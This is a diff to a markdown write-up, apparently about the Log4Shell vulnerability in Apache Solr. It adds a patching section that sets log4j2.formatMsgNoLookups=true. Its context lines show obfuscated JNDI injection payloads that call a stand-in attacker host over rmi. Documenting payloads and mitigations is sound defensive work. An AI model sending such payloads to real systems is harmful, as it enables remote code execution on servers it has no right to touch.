@@ -206,6 +206,12 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendp
 ${${::-j}ndi:rmi://attackerendpoint.com/}
 ```
 
+## Patching 
+
+Adding this Line of code in the `/etc/default/solr.in.sh` file patches the vulnerability
+
+`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`
+
 
 
 
